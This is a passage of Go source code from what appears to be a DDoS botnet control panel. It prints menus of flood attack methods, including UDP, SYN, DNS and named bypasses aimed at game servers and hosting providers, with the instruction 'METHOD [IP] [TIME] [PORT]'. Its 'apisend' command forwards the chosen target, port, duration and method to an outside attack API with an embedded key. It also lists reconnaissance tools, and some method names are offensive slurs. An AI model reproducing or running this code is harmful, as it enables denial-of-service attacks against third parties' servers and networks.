            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32msyn [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32movh [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mice [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mice [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\x1b[37m\r\n"))
		    time.Sleep(500 * time.Millisecond)
		    this.conn.Write([]byte("\033[2J\033[1H"))
		    this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns\x1b[1;35m 🤡\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mudp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mvse [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mtcp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mack [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstd [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mdns [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32msyn [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32movh [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mice [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mice [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\x1b[37m\r\n"))
		    time.Sleep(500 * time.Millisecond)
		    this.conn.Write([]byte("\033[2J\033[1H"))
		    this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns\x1b[1;35m 🤡\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mudp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mvse [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mtcp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mack [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstd [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mdns [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32msyn [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32movh [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mice [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mice [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\x1b[37m\r\n"))
		    time.Sleep(500 * time.Millisecond)
		    this.conn.Write([]byte("\033[2J\033[1H"))
		    this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns\x1b[1;35m 🤡\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mudp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mvse [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mtcp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mack [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstd [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mdns [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32msyn [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32movh [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mice [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mice [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\x1b[37m\r\n"))
            continue
        }   
        if err != nil || cmd == "private" || cmd == "PRIVATE" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhomeslap    . r6kill     \x1b[1;35m║ \x1b[1;32mfivemtcp  . nfokill        \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mark255      . arklift    \x1b[1;35m║ \x1b[1;32mhotspot   . vpn            \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhydrakiller . arkdown    \x1b[1;35m║ \x1b[1;32mnfonull   . dhcp           \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32movhnat    . ovhamp     \x1b[1;35m║ ║ \x1b[1;32movhwdz    . ovhx         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnfodrop   . nfocrush   \x1b[1;35m║ ║ \x1b[1;32mnfodown   . nfox         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprape   . udprapev3  \x1b[1;35m║ ║ \x1b[1;32mfortnite  . fortnitev2   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprapev2 . udpbypass  \x1b[1;35m║ ║ \x1b[1;32mgreeth    . telnet       \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemv2   . r6drop     \x1b[1;35m║ ║ \x1b[1;32mr6freeze  . killall      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32m2krape    . fallguys   \x1b[1;35m║ ║ \x1b[1;32movhdown   . ovhkill      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mvfivemrape . fivemdown \x1b[1;35m║ ║ \x1b[1;32mfivemv1   . fivemslump   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mkillallv2 . killallv3  \x1b[1;35m║ ║ \x1b[1;32mpowerslap . rapecom     \x1b[1;35m ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m \r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhomeslap    . r6kill     \x1b[1;35m║ \x1b[1;32mfivemtcp  . nfokill        \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mark255      . arklift    \x1b[1;35m║ \x1b[1;32mhotspot   . vpn            \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhydrakiller . arkdown    \x1b[1;35m║ \x1b[1;32mnfonull   . dhcp           \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32movhnat    . ovhamp     \x1b[1;35m║ ║ \x1b[1;32movhwdz    . ovhx         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnfodrop   . nfocrush   \x1b[1;35m║ ║ \x1b[1;32mnfodown   . nfox         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprape   . udprapev3  \x1b[1;35m║ ║ \x1b[1;32mfortnite  . fortnitev2   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprapev2 . udpbypass  \x1b[1;35m║ ║ \x1b[1;32mgreeth    . telnet       \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemv2   . r6drop     \x1b[1;35m║ ║ \x1b[1;32mr6freeze  . killall      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32m2krape    . fallguys   \x1b[1;35m║ ║ \x1b[1;32movhdown   . ovhkill      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mvfivemrape . fivemdown \x1b[1;35m║ ║ \x1b[1;32mfivemv1   . fivemslump   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mkillallv2 . killallv3  \x1b[1;35m║ ║ \x1b[1;32mpowerslap . rapecom     \x1b[1;35m ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m \r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhomeslap    . r6kill     \x1b[1;35m║ \x1b[1;32mfivemtcp  . nfokill        \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mark255      . arklift    \x1b[1;35m║ \x1b[1;32mhotspot   . vpn            \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhydrakiller . arkdown    \x1b[1;35m║ \x1b[1;32mnfonull   . dhcp           \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32movhnat    . ovhamp     \x1b[1;35m║ ║ \x1b[1;32movhwdz    . ovhx         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnfodrop   . nfocrush   \x1b[1;35m║ ║ \x1b[1;32mnfodown   . nfox         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprape   . udprapev3  \x1b[1;35m║ ║ \x1b[1;32mfortnite  . fortnitev2   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprapev2 . udpbypass  \x1b[1;35m║ ║ \x1b[1;32mgreeth    . telnet       \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemv2   . r6drop     \x1b[1;35m║ ║ \x1b[1;32mr6freeze  . killall      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32m2krape    . fallguys   \x1b[1;35m║ ║ \x1b[1;32movhdown   . ovhkill      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mvfivemrape . fivemdown \x1b[1;35m║ ║ \x1b[1;32mfivemv1   . fivemslump   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mkillallv2 . killallv3  \x1b[1;35m║ ║ \x1b[1;32mpowerslap . rapecom     \x1b[1;35m ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m \r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		    this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhomeslap    . r6kill     \x1b[1;35m║ \x1b[1;32mfivemtcp  . nfokill        \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mark255      . arklift    \x1b[1;35m║ \x1b[1;32mhotspot   . vpn            \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhydrakiller . arkdown    \x1b[1;35m║ \x1b[1;32mnfonull   . dhcp           \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32movhnat    . ovhamp     \x1b[1;35m║ ║ \x1b[1;32movhwdz    . ovhx         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnfodrop   . nfocrush   \x1b[1;35m║ ║ \x1b[1;32mnfodown   . nfox         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprape   . udprapev3  \x1b[1;35m║ ║ \x1b[1;32mfortnite  . fortnitev2   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprapev2 . udpbypass  \x1b[1;35m║ ║ \x1b[1;32mgreeth    . telnet       \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemv2   . r6drop     \x1b[1;35m║ ║ \x1b[1;32mr6freeze  . killall      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32m2krape    . fallguys   \x1b[1;35m║ ║ \x1b[1;32movhdown   . ovhkill      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mvfivemrape . fivemdown \x1b[1;35m║ ║ \x1b[1;32mfivemv1   . fivemslump   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mkillallv2 . killallv3  \x1b[1;35m║ ║ \x1b[1;32mpowerslap . rapecom     \x1b[1;35m ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m \r\n"))
            		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		    this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhomeslap    . r6kill     \x1b[1;35m║ \x1b[1;32mfivemtcp  . nfokill        \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mark255      . arklift    \x1b[1;35m║ \x1b[1;32mhotspot   . vpn            \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mhydrakiller . arkdown    \x1b[1;35m║ \x1b[1;32mnfonull   . dhcp           \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32movhnat    . ovhamp     \x1b[1;35m║ ║ \x1b[1;32movhwdz    . ovhx         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnfodrop   . nfocrush   \x1b[1;35m║ ║ \x1b[1;32mnfodown   . nfox         \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprape   . udprapev3  \x1b[1;35m║ ║ \x1b[1;32mfortnite  . fortnitev2   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mudprapev2 . udpbypass  \x1b[1;35m║ ║ \x1b[1;32mgreeth    . telnet       \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemv2   . r6drop     \x1b[1;35m║ ║ \x1b[1;32mr6freeze  . killall      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32m2krape    . fallguys   \x1b[1;35m║ ║ \x1b[1;32movhdown   . ovhkill      \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mvfivemrape . fivemdown \x1b[1;35m║ ║ \x1b[1;32mfivemv1   . fivemslump   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mkillallv2 . killallv3  \x1b[1;35m║ ║ \x1b[1;32mpowerslap . rapecom     \x1b[1;35m ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m \r\n"))
            continue
        }
        if err != nil || cmd == "TOOLS" || cmd == "tools" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[38m                   ╔════════════════\033[37m═══════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -ping - Ping an\033[37m IPv4              ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -iplookup - Loo\033[37mkup IPv4           ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -portscan - Por\033[37mtscan IPv4         ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -resolve - Reso\033[37mlve a URL          ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -reversedns - F\033[37mind DNS of an IPv4 ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -asnlookup - Fi\033[37mnd ASN of an IPv4  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -traceroute - T\033[37mraceroute On IPv4  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -subnetcalc - C\033[37malculate A Subnet  ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -whois - WHOIS \033[37mSearch             ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ║ -zonetransfer -\033[37m Shows ZT          ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m                   ╚════════════════\033[37m═══════════════════╝\x1b[37m\r\n"))
            continue
        }

        if strings.Contains(cmd, "@") {
        continue

        }

        if err != nil || cmd == "apisend" || cmd == "apisend" {
			this.conn.Write([]byte("\x1b[1;37mIPv4\x1b[1;37m: \x1b[0m"))
			HOST, err := this.ReadLine(false)
			this.conn.Write([]byte("\x1b[1;37mPORT\x1b[1;37m: \x1b[0m"))
			PORT, err := this.ReadLine(false)
            this.conn.Write([]byte("\x1b[1;37mTIME\x1b[1;37m: \x1b[0m"))
            TIME, err := this.ReadLine(false)
            this.conn.Write([]byte("\x1b[1;37mMETHOD\x1b[1;37m: \x1b[0m"))
            METHOD, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://asalentsvpnservices.com/AttackApiAccess/Bypasses420666hahaha.php?key=cfuam9292?eda&host=" + HOST + "&port=" + PORT + "&time=" + TIME + "&method=" + METHOD + ""
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[37mAttack Sent. Please wait 5m and send again if not sent.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[37mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;37mResults\x1b[1;37m: \r\n\x1b[1;37m" + locformatted + "\x1b[0m\r\n"))

        }
        if err != nil || cmd == "-IPLOOKUP" || cmd == "-iplookup" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
